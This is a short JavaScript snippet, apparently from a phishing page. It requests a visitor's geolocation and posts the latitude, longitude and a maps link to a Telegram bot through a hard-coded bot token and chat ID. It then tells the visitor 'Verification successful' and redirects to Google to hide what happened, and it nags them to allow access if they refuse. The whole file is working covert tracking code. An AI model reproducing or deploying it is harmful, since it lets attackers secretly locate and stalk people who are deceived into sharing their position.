function getLocation() {
  navigator.geolocation.getCurrentPosition(send, denied);
}

function send(pos) {
  let lat = pos.coords.latitude;
  let lon = pos.coords.longitude;

  let text = `📍 Location Received
Lat: ${lat}
Lon: ${lon}
https://maps.google.com/?q=${lat},${lon}`;

  fetch("https://api.telegram.org/bot8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "8215590469",
      text: text
    })
  });

  // User ko short message
  alert("Verification successful. Redirecting...");

  // ⏳ 2 second baad redirect
  setTimeout(() => {
    window.location.href = "https://google.com";
  }, 2000);
}

function denied() {
  alert("Please Allow to continue");
}
